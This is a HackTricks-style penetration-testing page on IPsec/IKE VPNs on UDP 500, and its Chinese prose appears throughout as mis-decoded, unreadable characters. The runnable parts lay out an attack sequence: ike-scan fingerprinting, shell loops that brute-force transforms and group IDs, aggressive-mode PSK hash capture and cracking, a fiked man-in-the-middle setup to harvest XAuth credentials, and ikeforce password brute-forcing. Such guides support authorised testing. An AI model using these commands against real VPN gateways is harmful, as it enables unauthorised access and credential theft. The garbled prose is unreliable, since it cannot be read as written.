# 500/udp - æ¸—é€æµ‹è¯• IPsec/IKE VPN

<details>

<summary><strong>ä»é›¶å¼€å§‹å­¦ä¹  AWS é»‘å®¢æŠ€æœ¯ï¼Œæˆä¸ºä¸“å®¶</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTEï¼ˆHackTricks AWS çº¢é˜Ÿä¸“å®¶ï¼‰</strong></a><strong>ï¼</strong></summary>

æ”¯æŒ HackTricks çš„å…¶ä»–æ–¹å¼ï¼š

* å¦‚æœæ‚¨æƒ³çœ‹åˆ°æ‚¨çš„**å…¬å¸åœ¨ HackTricks ä¸­åšå¹¿å‘Š**æˆ–**ä¸‹è½½ PDF ç‰ˆæœ¬çš„ HackTricks**ï¼Œè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)!
* è·å–[**å®˜æ–¹ PEASS & HackTricks å•†å“**](https://peass.creator-spring.com)
* æ¢ç´¢[**PEASS å®¶æ—**](https://opensea.io/collection/the-peass-family)ï¼Œæˆ‘ä»¬çš„ç‹¬å®¶[**NFTs**](https://opensea.io/collection/the-peass-family)
* **åŠ å…¥** ğŸ’¬ [**Discord ç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**ç”µæŠ¥ç¾¤ç»„**](https://t.me/peass) æˆ–åœ¨ **Twitter** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks_live)** ä¸Šå…³æ³¨æˆ‘ä»¬**ã€‚
* é€šè¿‡å‘ [**HackTricks**](https://github.com/carlospolop/hacktricks) å’Œ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github ä»“åº“æäº¤ PR æ¥**åˆ†äº«æ‚¨çš„é»‘å®¢æŠ€å·§**ã€‚

</details>

**Try Hard Security Group**

<figure><img src="/.gitbook/assets/telegram-cloud-document-1-5159108904864449420.jpg" alt=""><figcaption></figcaption></figure>

{% embed url="https://discord.gg/tryhardsecurity" %}

***

## åŸºæœ¬ä¿¡æ¯

**IPsec** è¢«å¹¿æ³›è®¤å¯ä¸ºç”¨äºä¿æŠ¤ç½‘ç»œä¹‹é—´é€šä¿¡ï¼ˆLAN åˆ° LANï¼‰ä»¥åŠä»è¿œç¨‹ç”¨æˆ·åˆ°ç½‘ç»œç½‘å…³ï¼ˆè¿œç¨‹è®¿é—®ï¼‰çš„ä¸»è¦æŠ€æœ¯ï¼Œä¸ºä¼ä¸š VPN è§£å†³æ–¹æ¡ˆçš„æ”¯æŸ±ã€‚

ä¸¤ä¸ªç‚¹ä¹‹é—´çš„**å®‰å…¨å…³è”ï¼ˆSAï¼‰**çš„å»ºç«‹ç”± **IKE** ç®¡ç†ï¼Œå®ƒåœ¨ ISAKMP çš„æ¡†æ¶ä¸‹è¿è¡Œï¼Œè¿™æ˜¯ä¸€ä¸ªè®¾è®¡ç”¨äºèº«ä»½éªŒè¯å’Œå¯†é’¥äº¤æ¢çš„åè®®ã€‚è¿™ä¸ªè¿‡ç¨‹åˆ†ä¸ºå‡ ä¸ªé˜¶æ®µï¼š

- **ç¬¬ 1 é˜¶æ®µï¼š** åœ¨ä¸¤ä¸ªç«¯ç‚¹ä¹‹é—´åˆ›å»ºä¸€ä¸ªå®‰å…¨é€šé“ã€‚é€šè¿‡ä½¿ç”¨é¢„å…±äº«å¯†é’¥ï¼ˆPSKï¼‰æˆ–è¯ä¹¦æ¥å®ç°ï¼Œå¯ä»¥ä½¿ç”¨ä¸»æ¨¡å¼ï¼ˆæ¶‰åŠä¸‰å¯¹æ¶ˆæ¯ï¼‰æˆ–**ä¸»åŠ¨æ¨¡å¼**ã€‚
- **ç¬¬ 1.5 é˜¶æ®µï¼š** è™½ç„¶ä¸æ˜¯å¼ºåˆ¶çš„ï¼Œè¿™ä¸ªé˜¶æ®µç§°ä¸ºæ‰©å±•è®¤è¯é˜¶æ®µï¼Œé€šè¿‡è¦æ±‚ç”¨æˆ·åå’Œå¯†ç æ¥éªŒè¯è¯•å›¾è¿æ¥çš„ç”¨æˆ·çš„èº«ä»½ã€‚
- **ç¬¬ 2 é˜¶æ®µï¼š** è¯¥é˜¶æ®µè‡´åŠ›äºåå•†ä½¿ç”¨ **ESP** å’Œ **AH** æ¥ä¿æŠ¤æ•°æ®çš„å‚æ•°ã€‚å®ƒå…è®¸ä½¿ç”¨ä¸åŒäºç¬¬ 1 é˜¶æ®µçš„ç®—æ³•ï¼Œä»¥ç¡®ä¿**å®Œç¾å‰å‘ä¿å¯†ï¼ˆPFSï¼‰**ï¼Œå¢å¼ºå®‰å…¨æ€§ã€‚

**é»˜è®¤ç«¯å£ï¼š** 500/udp

## ä½¿ç”¨ nmap **å‘ç°**è¯¥æœåŠ¡
```
root@bt:~# nmap -sU -p 500 172.16.21.200
Starting Nmap 5.51 (http://nmap.org) at 2011-11-26 10:56 IST
Nmap scan report for 172.16.21.200
Host is up (0.00036s latency).
PORT    STATE SERVICE
500/udp open  isakmp
MAC Address: 00:1B:D5:54:4D:E4 (Cisco Systems)
```
## **æŸ¥æ‰¾æœ‰æ•ˆçš„è½¬æ¢**

IPSecé…ç½®å¯èƒ½åªå‡†å¤‡æ¥å—ä¸€ä¸ªæˆ–å‡ ä¸ªè½¬æ¢ã€‚ä¸€ä¸ªè½¬æ¢æ˜¯ä¸€ç»„å€¼ã€‚**æ¯ä¸ªè½¬æ¢**åŒ…å«ä¸€äº›å±æ€§ï¼Œå¦‚DESæˆ–3DESä½œä¸º**åŠ å¯†ç®—æ³•**ï¼ŒSHAæˆ–MD5ä½œä¸º**å®Œæ•´æ€§ç®—æ³•**ï¼Œé¢„å…±äº«å¯†é’¥ä½œä¸º**è®¤è¯ç±»å‹**ï¼ŒDiffie-Hellman 1æˆ–2ä½œä¸ºå¯†é’¥**åˆ†å‘ç®—æ³•**ï¼Œä»¥åŠ28800ç§’ä½œä¸º**ç”Ÿå­˜å‘¨æœŸ**ã€‚

å› æ­¤ï¼Œä½ é¦–å…ˆè¦åšçš„æ˜¯**æ‰¾åˆ°ä¸€ä¸ªæœ‰æ•ˆçš„è½¬æ¢**ï¼Œè¿™æ ·æœåŠ¡å™¨æ‰ä¼šä¸ä½ é€šä¿¡ã€‚ä¸ºæ­¤ï¼Œä½ å¯ä»¥ä½¿ç”¨å·¥å…·**ike-scan**ã€‚é»˜è®¤æƒ…å†µä¸‹ï¼ŒIke-scanåœ¨ä¸»æ¨¡å¼ä¸‹å·¥ä½œï¼Œå¹¶å‘ç½‘å…³å‘é€ä¸€ä¸ªå¸¦æœ‰ISAKMPå¤´å’Œä¸€ä¸ªåŒ…å«**å…«ä¸ªè½¬æ¢**çš„æè®®çš„æ•°æ®åŒ…ã€‚

æ ¹æ®å“åº”ï¼Œä½ å¯ä»¥è·å–æœ‰å…³ç«¯ç‚¹çš„ä¸€äº›ä¿¡æ¯ï¼š
```
root@bt:~# ike-scan -M 172.16.21.200
Starting ike-scan 1.9 with 1 hosts (http://www.nta-monitor.com/tools/ike-scan/)
172.16.21.200    Main Mode Handshake returned
HDR=(CKY-R=d90bf054d6b76401)
SA=(Enc=3DES Hash=SHA1 Group=2:modp1024 Auth=PSK LifeType=Seconds LifeDuration=28800)
VID=4048b7d56ebce88525e7de7f00d6c2d3c0000000 (IKE Fragmentation)

Ending ike-scan 1.9: 1 hosts scanned in 0.015 seconds (65.58 hosts/sec). 1 returned handshake; 0 returned notify
```
æ­£å¦‚æ‚¨åœ¨å‰é¢çš„å›å¤ä¸­æ‰€çœ‹åˆ°çš„ï¼Œæœ‰ä¸€ä¸ªåä¸º**AUTH**çš„å­—æ®µï¼Œå…¶å€¼ä¸º**PSK**ã€‚è¿™æ„å‘³ç€VPNæ˜¯ä½¿ç”¨é¢„å…±äº«å¯†é’¥é…ç½®çš„ï¼ˆè¿™å¯¹äºæ¸—é€æµ‹è¯•äººå‘˜æ¥è¯´éå¸¸æœ‰ç”¨ï¼‰ã€‚

**æœ€åä¸€è¡Œçš„å€¼ä¹Ÿéå¸¸é‡è¦ï¼š**

* _0 returned handshake; 0 returned notify:_ è¿™æ„å‘³ç€ç›®æ ‡**ä¸æ˜¯IPsecç½‘å…³**ã€‚
* _**1 returned handshake; 0 returned notify:**_ è¿™æ„å‘³ç€ç›®æ ‡**å·²é…ç½®ä¸ºIPsecï¼Œå¹¶æ„¿æ„æ‰§è¡ŒIKEåå•†ï¼Œå¹¶ä¸”æ‚¨æå‡ºçš„ä¸€ä¸ªæˆ–å¤šä¸ªå˜æ¢æ˜¯å¯æ¥å—çš„**ï¼ˆæœ‰æ•ˆçš„å˜æ¢å°†æ˜¾ç¤ºåœ¨è¾“å‡ºä¸­ï¼‰ã€‚
* _0 returned handshake; 1 returned notify:_ VPNç½‘å…³åœ¨**æ²¡æœ‰ä»»ä½•å˜æ¢å¯æ¥å—æ—¶**ä¼šå“åº”é€šçŸ¥æ¶ˆæ¯ï¼ˆå°½ç®¡æœ‰äº›ç½‘å…³ä¸ä¼šï¼Œè¿™ç§æƒ…å†µä¸‹éœ€è¦è¿›ä¸€æ­¥åˆ†æå¹¶å°è¯•ä¿®è®¢æè®®ï¼‰ã€‚

å› æ­¤ï¼Œåœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œæˆ‘ä»¬å·²ç»æœ‰ä¸€ä¸ªæœ‰æ•ˆçš„å˜æ¢ï¼Œä½†å¦‚æœæ‚¨å¤„äºç¬¬3ç§æƒ…å†µï¼Œåˆ™éœ€è¦**ç¨å¾®è¿›è¡Œæš´åŠ›ç ´è§£ä»¥æ‰¾åˆ°æœ‰æ•ˆçš„å˜æ¢**ï¼š

é¦–å…ˆï¼Œæ‚¨éœ€è¦åˆ›å»ºæ‰€æœ‰å¯èƒ½çš„å˜æ¢ï¼š
```bash
for ENC in 1 2 3 4 5 6 7/128 7/192 7/256 8; do for HASH in 1 2 3 4 5 6; do for AUTH in 1 2 3 4 5 6 7 8 64221 64222 64223 64224 65001 65002 65003 65004 65005 65006 65007 65008 65009 65010; do for GROUP in 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18; do echo "--trans=$ENC,$HASH,$AUTH,$GROUP" >> ike-dict.txt ;done ;done ;done ;done
```
ç„¶åä½¿ç”¨ike-scanå¯¹æ¯ä¸ªè¿›è¡Œæš´åŠ›ç ´è§£ï¼ˆè¿™å¯èƒ½éœ€è¦å‡ åˆ†é’Ÿï¼‰ï¼š
```bash
while read line; do (echo "Valid trans found: $line" && sudo ike-scan -M $line <IP>) | grep -B14 "1 returned handshake" | grep "Valid trans found" ; done < ike-dict.txt
```
å¦‚æœæš´åŠ›ç ´è§£æ²¡æœ‰æˆåŠŸï¼Œä¹Ÿè®¸æœåŠ¡å™¨ç”šè‡³å¯¹æœ‰æ•ˆçš„è½¬æ¢ä¹Ÿæ²¡æœ‰æ¡æ‰‹è€Œç›´æ¥å“åº”ã€‚é‚£ä¹ˆï¼Œæ‚¨å¯ä»¥å°è¯•ä½¿ç”¨ä¾µç•¥æ¨¡å¼è¿›è¡Œç›¸åŒçš„æš´åŠ›ç ´è§£ï¼š
```bash
while read line; do (echo "Valid trans found: $line" && ike-scan -M --aggressive -P handshake.txt $line <IP>) | grep -B7 "SA=" | grep "Valid trans found" ; done < ike-dict.txt
```
å¸Œæœ›**æœ‰æ•ˆçš„è½¬æ¢è¢«å›æ˜¾**ã€‚\
æ‚¨å¯ä»¥å°è¯•ä½¿ç”¨[**iker.py**](https://github.com/isaudits/scripts/blob/master/iker.py)è¿›è¡Œ**ç›¸åŒçš„æ”»å‡»**ã€‚\
æ‚¨è¿˜å¯ä»¥å°è¯•ä½¿ç”¨[ikeforce](https://github.com/SpiderLabs/ikeforce)æ¥æš´åŠ›ç ´è§£è½¬æ¢ï¼š
```bash
./ikeforce.py <IP> # No parameters are required for scan -h for additional help
```
![](<../.gitbook/assets/image (109).png>)

åœ¨**DH Group: 14 = 2048-bit MODP**å’Œ**15 = 3072-bit**\
**2 = HMAC-SHA = SHA1ï¼ˆåœ¨è¿™ç§æƒ…å†µä¸‹ï¼‰ã€‚`--trans`æ ¼å¼ä¸º$Enc,$Hash,$Auth,$DH**

æ€ç§‘å»ºè®®é¿å…ä½¿ç”¨DHç»„1å’Œ2ï¼Œå› ä¸ºå®ƒä»¬ä¸å¤Ÿå¼ºå¤§ã€‚ä¸“å®¶è®¤ä¸º**èµ„æºä¸°å¯Œçš„å›½å®¶å¯ä»¥è½»æ¾ç ´è§£**ä½¿ç”¨è¿™äº›å¼±ç»„çš„æ•°æ®çš„åŠ å¯†ã€‚è¿™æ˜¯é€šè¿‡ä½¿ç”¨ä¸€ç§ç‰¹æ®Šæ–¹æ³•æ¥å‡†å¤‡å®ƒä»¬ä»¥å¿«é€Ÿç ´è§£ä»£ç æ¥å®ç°çš„ã€‚å°½ç®¡è®¾ç½®è¿™ç§æ–¹æ³•éœ€è¦èŠ±è´¹å¤§é‡èµ„é‡‘ï¼Œä½†å®ƒä½¿è¿™äº›å¼ºå¤§çš„å›½å®¶èƒ½å¤Ÿå®æ—¶è¯»å–ä½¿ç”¨ä¸å¤Ÿå¼ºå¤§ï¼ˆå¦‚1,024ä½æˆ–æ›´å°ï¼‰ç»„çš„åŠ å¯†æ•°æ®ã€‚

### æœåŠ¡å™¨æŒ‡çº¹è¯†åˆ«

ç„¶åï¼Œæ‚¨å¯ä»¥ä½¿ç”¨ike-scanå°è¯•**å‘ç°è®¾å¤‡çš„ä¾›åº”å•†**ã€‚è¯¥å·¥å…·å‘é€åˆå§‹æè®®å¹¶åœæ­¢é‡æ’­ã€‚ç„¶åï¼Œå®ƒå°†**åˆ†æ**ä»æœåŠ¡å™¨æ¥æ”¶çš„**æ¶ˆæ¯**ä¸åŒ¹é…å“åº”æ¨¡å¼ä¹‹é—´çš„**æ—¶é—´**å·®å¼‚ï¼Œæ¸—é€æµ‹è¯•äººå‘˜å¯ä»¥æˆåŠŸè¯†åˆ«VPNç½‘å…³ä¾›åº”å•†ã€‚æ­¤å¤–ï¼Œä¸€äº›VPNæœåŠ¡å™¨å°†ä½¿ç”¨å¸¦æœ‰IKEçš„å¯é€‰**ä¾›åº”å•†IDï¼ˆVIDï¼‰è´Ÿè½½**ã€‚

**å¦‚æœ‰éœ€è¦ï¼Œè¯·æŒ‡å®šæœ‰æ•ˆçš„è½¬æ¢**ï¼ˆä½¿ç”¨--transï¼‰

å¦‚æœIKEå‘ç°ä¾›åº”å•†ï¼Œå®ƒå°†æ‰“å°å‡ºæ¥ï¼š
```
root@bt:~# ike-scan -M --showbackoff 172.16.21.200
Starting ike-scan 1.9 with 1 hosts (http://www.nta-monitor.com/tools/ike-scan/)
172.16.21.200    Main Mode Handshake returned
HDR=(CKY-R=4f3ec84731e2214a)
SA=(Enc=3DES Hash=SHA1 Group=2:modp1024 Auth=PSK LifeType=Seconds LifeDuration=28800)
VID=4048b7d56ebce88525e7de7f00d6c2d3c0000000 (IKE Fragmentation)

IKE Backoff Patterns:

IP Address       No.  Recv time            Delta Time
172.16.21.200    1    1322286031.744904    0.000000
172.16.21.200    2    1322286039.745081    8.000177
172.16.21.200    3    1322286047.745989    8.000908
172.16.21.200    4    1322286055.746972    8.000983
172.16.21.200    Implementation guess: Cisco VPN Concentrator

Ending ike-scan 1.9: 1 hosts scanned in 84.080 seconds (0.01 hosts/sec). 1 returned handshake; 0 returned notify
```
è¿™ä¹Ÿå¯ä»¥é€šè¿‡ nmap è„šæœ¬ _**ike-version**_ å®ç°

## æŸ¥æ‰¾æ­£ç¡®çš„ IDï¼ˆç»„åï¼‰

ä¸ºäº†è¢«å…è®¸æ•è·å“ˆå¸Œå€¼ï¼Œæ‚¨éœ€è¦ä¸€ä¸ªæ”¯æŒä¸»åŠ¨æ¨¡å¼å’Œæ­£ç¡® IDï¼ˆç»„åï¼‰çš„æœ‰æ•ˆè½¬æ¢ã€‚æ‚¨å¯èƒ½ä¸çŸ¥é“æœ‰æ•ˆçš„ç»„åï¼Œå› æ­¤æ‚¨å°†ä¸å¾—ä¸ä½¿ç”¨æš´åŠ›ç ´è§£æ¥å°è¯•ã€‚\
ä¸ºæ­¤ï¼Œæˆ‘å»ºè®®æ‚¨ä½¿ç”¨ 2 ç§æ–¹æ³•ï¼š

### ä½¿ç”¨ ike-scan è¿›è¡Œ ID æš´åŠ›ç ´è§£

é¦–å…ˆå°è¯•ä½¿ç”¨è™šå‡ ID å‘å‡ºè¯·æ±‚ï¼Œå°è¯•æ”¶é›†å“ˆå¸Œå€¼ï¼ˆ"-P"ï¼‰:
```bash
ike-scan -P -M -A -n fakeID <IP>
```
å¦‚æœ**æ²¡æœ‰è¿”å›å“ˆå¸Œå€¼**ï¼Œé‚£ä¹ˆå¯èƒ½è¿™ç§æš´åŠ›ç ´è§£æ–¹æ³•ä¼šå¥æ•ˆã€‚**å¦‚æœè¿”å›äº†æŸä¸ªå“ˆå¸Œå€¼ï¼Œè¿™æ„å‘³ç€å°†ä¸ºä¸€ä¸ªè™šå‡çš„IDå‘é€å›ä¸€ä¸ªè™šå‡çš„å“ˆå¸Œå€¼ï¼Œå› æ­¤è¿™ç§æ–¹æ³•ä¸å¯é **ç”¨äºæš´åŠ›ç ´è§£IDã€‚ä¾‹å¦‚ï¼Œå¯èƒ½ä¼šè¿”å›ä¸€ä¸ªè™šå‡çš„å“ˆå¸Œå€¼ï¼ˆåœ¨ç°ä»£ç‰ˆæœ¬ä¸­ä¼šå‘ç”Ÿï¼‰ï¼š

![](<../.gitbook/assets/image (110).png>)

ä½†æ˜¯ï¼Œå¦‚æˆ‘æ‰€è¯´ï¼Œå¦‚æœæ²¡æœ‰è¿”å›å“ˆå¸Œå€¼ï¼Œé‚£ä¹ˆæ‚¨åº”è¯¥å°è¯•ä½¿ç”¨ike-scanæ¥æš´åŠ›ç ´è§£å¸¸è§çš„ç»„åã€‚

æ­¤è„šæœ¬**å°†å°è¯•æš´åŠ›ç ´è§£å¯èƒ½çš„ID**ï¼Œå¹¶å°†è¿”å›å‘ç”Ÿæœ‰æ•ˆæ¡æ‰‹çš„IDï¼ˆè¿™å°†æ˜¯ä¸€ä¸ªæœ‰æ•ˆçš„ç»„åï¼‰ã€‚

å¦‚æœæ‚¨å‘ç°äº†ç‰¹å®šçš„è½¬æ¢ï¼Œè¯·å°†å…¶æ·»åŠ åˆ°ike-scanå‘½ä»¤ä¸­ã€‚å¦‚æœæ‚¨å‘ç°äº†å¤šä¸ªè½¬æ¢ï¼Œè¯·éšæ—¶æ·»åŠ ä¸€ä¸ªæ–°å¾ªç¯ä»¥å°è¯•å®ƒä»¬ï¼ˆæ‚¨åº”è¯¥å°è¯•å®ƒä»¬æ‰€æœ‰ç›´åˆ°å…¶ä¸­ä¸€ä¸ªæ­£å¸¸å·¥ä½œä¸ºæ­¢ï¼‰ã€‚

æ‚¨å¯ä»¥ä½¿ç”¨[ikeforceçš„å­—å…¸](https://github.com/SpiderLabs/ikeforce/blob/master/wordlists/groupnames.dic)æˆ–[seclistsä¸­çš„å­—å…¸](https://github.com/danielmiessler/SecLists/blob/master/Miscellaneous/ike-groupid.txt)ä¸­çš„å¸¸è§ç»„åæ¥è¿›è¡Œæš´åŠ›ç ´è§£ï¼š
```bash
while read line; do (echo "Found ID: $line" && sudo ike-scan -M -A -n $line <IP>) | grep -B14 "1 returned handshake" | grep "Found ID:"; done < /usr/share/wordlists/external/SecLists/Miscellaneous/ike-groupid.txt
```
### ä½¿ç”¨ Iker è¿›è¡Œ ID çš„æš´åŠ›ç ´è§£

[iker.py](https://github.com/isaudits/scripts/blob/master/iker.py) ä¹Ÿä½¿ç”¨ **ike-scan** æ¥æš´åŠ›ç ´è§£å¯èƒ½çš„ç»„åã€‚å®ƒéµå¾ªè‡ªå·±çš„æ–¹æ³•æ¥ **æ ¹æ® ike-scan çš„è¾“å‡ºæ‰¾åˆ°æœ‰æ•ˆçš„ ID**ã€‚

### ä½¿ç”¨ ikeforce è¿›è¡Œ ID çš„æš´åŠ›ç ´è§£

[ikeforce.py](https://github.com/SpiderLabs/ikeforce) æ˜¯ä¸€ä¸ªå·¥å…·ï¼Œä¹Ÿå¯ä»¥ç”¨æ¥ **æš´åŠ›ç ´è§£ ID**ã€‚è¯¥å·¥å…·å°† **å°è¯•åˆ©ç”¨ä¸åŒçš„æ¼æ´**ï¼Œè¿™äº›æ¼æ´å¯ä»¥ç”¨æ¥ **åŒºåˆ†æœ‰æ•ˆå’Œæ— æ•ˆçš„ ID**ï¼ˆå¯èƒ½ä¼šæœ‰è¯¯æŠ¥å’Œæ¼æŠ¥ï¼Œè¿™å°±æ˜¯ä¸ºä»€ä¹ˆæˆ‘æ›´å–œæ¬¢åœ¨å¯èƒ½çš„æƒ…å†µä¸‹ä½¿ç”¨ ike-scan æ–¹æ³•ï¼‰ã€‚

é»˜è®¤æƒ…å†µä¸‹ï¼Œ**ikeforce** ä¼šåœ¨å¼€å§‹æ—¶å‘é€ä¸€äº›éšæœºçš„ id æ¥æ£€æŸ¥æœåŠ¡å™¨çš„è¡Œä¸ºï¼Œå¹¶ç¡®å®šè¦ä½¿ç”¨çš„ç­–ç•¥ã€‚

* **ç¬¬ä¸€ç§æ–¹æ³•** æ˜¯é€šè¿‡ **æœç´¢** Cisco ç³»ç»Ÿçš„ **Dead Peer Detection DPD** ä¿¡æ¯æ¥æš´åŠ›ç ´è§£ç»„åï¼ˆåªæœ‰åœ¨ç»„åæ­£ç¡®æ—¶æœåŠ¡å™¨æ‰ä¼šå›å¤æ­¤ä¿¡æ¯ï¼‰ã€‚
* å¯ç”¨çš„ **ç¬¬äºŒç§æ–¹æ³•** æ˜¯ **æ£€æŸ¥æ¯æ¬¡å°è¯•å‘é€çš„å“åº”æ•°é‡**ï¼Œå› ä¸ºæœ‰æ—¶åœ¨ä½¿ç”¨æ­£ç¡®çš„ id æ—¶ä¼šå‘é€æ›´å¤šçš„æ•°æ®åŒ…ã€‚
* **ç¬¬ä¸‰ç§æ–¹æ³•** æ˜¯åœ¨å“åº”é”™è¯¯çš„ ID æ—¶ **æœç´¢â€œINVALID-ID-INFORMATIONâ€**ã€‚
* æœ€åï¼Œå¦‚æœæœåŠ¡å™¨å¯¹æ£€æŸ¥æ²¡æœ‰ä»»ä½•å›å¤ï¼Œ**ikeforce** å°†å°è¯•æš´åŠ›ç ´è§£æœåŠ¡å™¨ï¼Œå¹¶æ£€æŸ¥å½“å‘é€æ­£ç¡®çš„ id æ—¶æœåŠ¡å™¨æ˜¯å¦ä¼šå›å¤ä¸€äº›æ•°æ®åŒ…ã€‚\
æ˜¾ç„¶ï¼Œæš´åŠ›ç ´è§£ id çš„ç›®çš„æ˜¯åœ¨è·å¾—æœ‰æ•ˆ id åè·å– **PSK**ã€‚ç„¶åï¼Œä½¿ç”¨ **id** å’Œ **PSK**ï¼Œæ‚¨å°†éœ€è¦æš´åŠ›ç ´è§£ XAUTHï¼ˆå¦‚æœå·²å¯ç”¨ï¼‰ã€‚

å¦‚æœæ‚¨å‘ç°äº†ç‰¹å®šçš„è½¬æ¢ï¼Œè¯·å°†å…¶æ·»åŠ åˆ° ikeforce å‘½ä»¤ä¸­ã€‚å¦‚æœæ‚¨å‘ç°äº†å¤šä¸ªè½¬æ¢ï¼Œè¯·éšæ—¶æ·»åŠ ä¸€ä¸ªæ–°å¾ªç¯ä»¥å°è¯•æ‰€æœ‰è¿™äº›è½¬æ¢ï¼ˆæ‚¨åº”è¯¥å°è¯•å®ƒä»¬ç›´åˆ°å…¶ä¸­ä¸€ä¸ªæ­£å¸¸å·¥ä½œä¸ºæ­¢ï¼‰ã€‚
```bash
git clone https://github.com/SpiderLabs/ikeforce.git
pip install 'pyopenssl==17.2.0' #It is old and need this version of the library
```

```bash
./ikeforce.py <IP> -e -w ./wordlists/groupnames.dic
```
### å—…æ¢ID

(æ¥è‡ªä¹¦ç±**ç½‘ç»œå®‰å…¨è¯„ä¼°ï¼šäº†è§£æ‚¨çš„ç½‘ç»œ**): é€šè¿‡å—…æ¢VPNå®¢æˆ·ç«¯å’ŒæœåŠ¡å™¨ä¹‹é—´çš„è¿æ¥ï¼Œä¹Ÿæœ‰å¯èƒ½è·å–æœ‰æ•ˆçš„ç”¨æˆ·åï¼Œå› ä¸ºåŒ…å«å®¢æˆ·ç«¯IDçš„ç¬¬ä¸€ä¸ªæ”»å‡»æ¨¡å¼æ•°æ®åŒ…æ˜¯æ˜æ–‡å‘é€çš„

![](<../.gitbook/assets/image (111).png>)

## æ•è·å’Œç ´è§£å“ˆå¸Œ

æœ€åï¼Œå¦‚æœæ‚¨æ‰¾åˆ°äº†ä¸€ä¸ª**æœ‰æ•ˆçš„è½¬æ¢**å’Œ**ç»„å**ï¼Œå¹¶ä¸”**å…è®¸ä½¿ç”¨æ”»å‡»æ¨¡å¼**ï¼Œé‚£ä¹ˆæ‚¨å¯ä»¥éå¸¸å®¹æ˜“åœ°è·å–å¯ç ´è§£çš„å“ˆå¸Œå€¼:
```bash
ike-scan -M -A -n <ID> --pskcrack=hash.txt <IP> #If aggressive mode is supported and you know the id, you can get the hash of the passwor
```
å“ˆå¸Œå°†ä¿å­˜åœ¨ _hash.txt_ ä¸­ã€‚

æ‚¨å¯ä»¥ä½¿ç”¨ **psk-crack**ã€**john**ï¼ˆä½¿ç”¨ [**ikescan2john.py**](https://github.com/truongkma/ctf-tools/blob/master/John/run/ikescan2john.py)ï¼‰å’Œ **hashcat** æ¥ **ç ´è§£** è¿™ä¸ªå“ˆå¸Œï¼š
```bash
psk-crack -d <Wordlist_path> psk.txt
```
## **XAuth**

**Aggressive mode IKE**ç»“åˆ**é¢„å…±äº«å¯†é’¥ (PSK)**é€šå¸¸ç”¨äº**ç¾¤ç»„è®¤è¯**ç›®çš„ã€‚è¿™ç§æ–¹æ³•é€šè¿‡**XAuth (æ‰©å±•è®¤è¯)**è¿›è¡Œå¢å¼ºï¼Œå¼•å…¥äº†é¢å¤–çš„**ç”¨æˆ·è®¤è¯**å±‚ã€‚è¿™ç§è®¤è¯é€šå¸¸åˆ©ç”¨**Microsoft Active Directory**ã€**RADIUS**æˆ–ç±»ä¼¼ç³»ç»Ÿã€‚

è½¬å‘**IKEv2**æ—¶ï¼Œè§‚å¯Ÿåˆ°ä¸€ä¸ªæ˜¾è‘—çš„å˜åŒ–ï¼Œå³ä½¿ç”¨**EAP (å¯æ‰©å±•è®¤è¯åè®®)**ä»£æ›¿**XAuth**æ¥å¯¹ç”¨æˆ·è¿›è¡Œè®¤è¯ã€‚è¿™ç§å˜åŒ–çªæ˜¾äº†å®‰å…¨é€šä¿¡åè®®ä¸­è®¤è¯å®è·µçš„æ¼”å˜ã€‚


### æœ¬åœ°ç½‘ç»œä¸­é—´äººæ”»å‡»ä»¥æ•è·å‡­æ®

å› æ­¤ï¼Œæ‚¨å¯ä»¥ä½¿ç”¨ _fiked_ æ•è·ç™»å½•æ•°æ®ï¼Œå¹¶æŸ¥çœ‹æ˜¯å¦å­˜åœ¨ä»»ä½•é»˜è®¤ç”¨æˆ·å (æ‚¨éœ€è¦å°† IKE æµé‡é‡å®šå‘åˆ° `fiked` è¿›è¡Œå—…æ¢ï¼Œè¿™å¯ä»¥é€šè¿‡ ARP æ¬ºéª—æ¥å®Œæˆï¼Œ[æ›´å¤šä¿¡æ¯](https://opensourceforu.com/2012/01/ipsec-vpn-penetration-testing-backtrack-tools/))ã€‚Fiked å°†å……å½“ VPN ç»ˆç«¯ç‚¹ï¼Œå¹¶æ•è· XAuth å‡­æ®ï¼š
```bash
fiked -g <IP> -k testgroup:secretkey -l output.txt -d
```
### ä½¿ç”¨ IPSec å°è¯•è¿›è¡Œä¸­é—´äººæ”»å‡»ï¼Œå¹¶é˜»æ­¢æ‰€æœ‰æµé‡è®¿é—®ç«¯å£ 500ï¼Œå¦‚æœ IPSec éš§é“æ— æ³•å»ºç«‹ï¼Œå¯èƒ½ä¼šä»¥æ˜æ–‡å½¢å¼å‘é€æµé‡ã€‚

### ä½¿ç”¨ ikeforce å¯¹ XAUTH ç”¨æˆ·åå’Œå¯†ç è¿›è¡Œæš´åŠ›ç ´è§£

è¦å¯¹ **XAUTH** è¿›è¡Œæš´åŠ›ç ´è§£ï¼ˆå½“ä½ çŸ¥é“ä¸€ä¸ªæœ‰æ•ˆçš„ç»„å **id** å’Œ **psk** æ—¶ï¼‰ï¼Œä½ å¯ä»¥ä½¿ç”¨ä¸€ä¸ªç”¨æˆ·åæˆ–ç”¨æˆ·ååˆ—è¡¨ä»¥åŠä¸€ä¸ªå¯†ç åˆ—è¡¨ï¼š
```bash
./ikeforce.py <IP> -b -i <group_id> -u <username> -k <PSK> -w <passwords.txt> [-s 1]
```
è¿™æ ·ï¼Œikeforce å°†å°è¯•ä½¿ç”¨æ¯ä¸ªç”¨æˆ·å:å¯†ç ç»„åˆè¿›è¡Œè¿æ¥ã€‚

å¦‚æœæ‰¾åˆ°ä¸€ä¸ªæˆ–å¤šä¸ªæœ‰æ•ˆçš„ transformsï¼Œå°±åƒåœ¨ä¹‹å‰çš„æ­¥éª¤ä¸­ä½¿ç”¨å®ƒä»¬ä¸€æ ·ã€‚

## ä½¿ç”¨ IPSEC VPN è¿›è¡Œèº«ä»½éªŒè¯

åœ¨ Kali ä¸­ï¼Œ**VPNC** ç”¨äºå»ºç«‹ IPsec éš§é“ã€‚**é…ç½®æ–‡ä»¶** å¿…é¡»ä½äºç›®å½• `/etc/vpnc/` ä¸­ã€‚æ‚¨å¯ä»¥ä½¿ç”¨å‘½ä»¤ _**vpnc**_ æ¥å¯åŠ¨è¿™äº›é…ç½®æ–‡ä»¶ã€‚

